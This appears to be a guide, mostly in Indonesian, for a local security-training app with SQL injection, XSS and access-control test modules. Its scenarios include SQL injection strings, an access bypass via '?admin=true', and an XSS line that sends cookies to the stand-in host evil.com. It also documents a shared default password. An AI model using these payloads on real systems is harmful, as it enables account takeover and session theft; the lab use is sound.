# 📧 User Registration & Testing Guide

## ✅ USER MANAGEMENT INTEGRATION

Sekarang semua user yang didaftarkan di **USER MGMT** tab dapat langsung digunakan untuk testing di semua fitur!

---

## 🎯 CARA MENGGUNAKAN:

### 1️⃣ **DAFTAR USER BARU**
1. Buka tab **👥 USER MGMT**
2. Isi form:
   - **Email**: yourname@gmail.com
   - **Name**: Your Full Name
   - **Role**: USER / ADMIN / GUEST
3. Klik **🚀 CREATE USER**
4. User akan muncul di list dengan:
   - Username otomatis: `yourname` (dari email)
   - Password default: `default123`

---

### 2️⃣ **TESTING SQL INJECTION**

#### Login dengan User yang Terdaftar:
```
Tab: 💻 TERMINAL → Klik module [SQL_INJECTION.exe]

Username: yourname@gmail.com  (atau yourname)
Password: default123
Mode: Safe
```
✅ Hasil: Login successful dengan data user Anda!

#### Test SQL Injection Attack:
```
Username: yourname@gmail.com' OR '1'='1
Password: anything
Mode: Vulnerable
```
🚨 Hasil: SQL Injection terdeteksi + Semua user database ter-expose!

---

### 3️⃣ **TESTING XSS (Cross-Site Scripting)**

```
Tab: 💻 TERMINAL → Klik module [XSS_PAYLOAD.exe]

Author: yourname@gmail.com
Comment: <script>alert('XSS')</script>
Mode: Vulnerable
```
🚨 Hasil: XSS vulnerability terdeteksi!

---

### 4️⃣ **TESTING ACCESS CONTROL**

#### Test dengan Email/Username:
```
Tab: 💻 TERMINAL → Klik module [ACCESS_BYPASS.exe]

Resource: /admin
User Token: yourname@gmail.com  (gunakan email Anda)
Mode: Safe
Bypass Attempt: false
```

**Hasil berdasarkan Role:**
- GUEST → ❌ Access denied ke /admin
- USER → ❌ Access denied ke /admin
- ADMIN → ✅ Access granted ke /admin

#### Test Bypass Attack:
```
Resource: /admin?admin=true
User Token: yourname@gmail.com
Mode: Vulnerable
Bypass Attempt: true
```
🚨 Hasil: Access control bypassed!

---

## 📊 CONTOH SKENARIO LENGKAP:

### **Skenario 1: Normal User**
```javascript
// 1. Register user
Email: john.doe@gmail.com
Name: John Doe  
Role: USER

// 2. Test SQL Injection - Safe Mode
Username: john.doe@gmail.com
Password: default123
Mode: Safe
Result: ✅ Login successful

// 3. Test Access Control
Resource: /dashboard
Token: john.doe@gmail.com
Result: ✅ Access granted (USER has access to /dashboard)

// 4. Try admin access
Resource: /admin
Token: john.doe@gmail.com
Result: ❌ Access denied (USER doesn't have access to /admin)
```

### **Skenario 2: Admin User**
```javascript
// 1. Register admin
Email: admin@company.com
Name: System Admin
Role: ADMIN

// 2. Test Access Control
Resource: /admin
Token: admin@company.com
Result: ✅ Access granted (ADMIN has full access)
```

### **Skenario 3: Attack Simulation**
```javascript
// 1. Register victim
Email: victim@email.com
Name: Victim User
Role: USER

// 2. SQL Injection Attack
Username: victim@email.com' OR '1'='1' --
Password: any
Mode: Vulnerable
Result: 🚨 All users exposed! (termasuk victim@email.com)

// 3. XSS Attack
Author: attacker@evil.com
Comment: <script>document.location='http://evil.com?c='+document.cookie</script>
Mode: Vulnerable
Result: 🚨 Cookie theft possible!
```

---

## 🔑 INFORMASI PENTING:

### **Default Credentials:**
```
Username: [email prefix] atau [full email]
Password: default123
```

### **Role Permissions:**
```javascript
GUEST:
  - /public, /home

USER:
  - /public, /home, /profile, /dashboard

ADMIN:
  - All resources including /admin, /api/users, /api/reports
```

### **Input Format yang Diterima:**
```
✅ Email: user@gmail.com
✅ Username: user
✅ Keduanya bisa digunakan untuk login!
```

---

## 🎨 FITUR TERINTEGRASI:

### ✅ **SQL Injection Module**
- Login dengan email/username terdaftar
- Safe mode: validasi database real
- Vulnerable mode: expose semua user

### ✅ **XSS Module**  
- Author bisa pakai email terdaftar
- Comment stored di database
- Test sanitization

### ✅ **Access Control Module**
- User token: gunakan email/username
- Role-based permissions
- Bypass detection

### ✅ **CSRF Protection**
- Session management
- Token validation
- Forged request simulation

### ✅ **Security Headers**
- Header scanning
- Security scoring
- Config recommendations

### ✅ **Rate Limiting**
- Brute force protection
- Account lockout
- Login attempt tracking

---

## 📝 QUICK REFERENCE:

### **Tambah User:**
```
Tab: 👥 USER MGMT → Fill form → CREATE USER
```

### **Test SQL Injection:**
```
Tab: 💻 TERMINAL → SQL_INJECTION.exe
Username: [email or username]
Password: default123 (or attack payload)
```

### **Test Access Control:**
```
Tab: 💻 TERMINAL → ACCESS_BYPASS.exe
Token: [email or username]
Resource: [/admin or /dashboard]
```

### **View All Users:**
```
Tab: 👥 USER MGMT → List shows all registered users
```

### **Delete User:**
```
Tab: 👥 USER MGMT → Click 🗑️ DELETE on user card
```

---

## 🚀 SEKARANG SEMUA FITUR SUDAH TERINTEGRASI!

**Email yang didaftarkan = Bisa digunakan di semua testing module!** 🎉

**Database:** SQLite (local)  
**Location:** `prisma/dev.db`  
**Prisma Studio:** http://localhost:5555

---

**Happy Testing! 🛡️💻🔥**
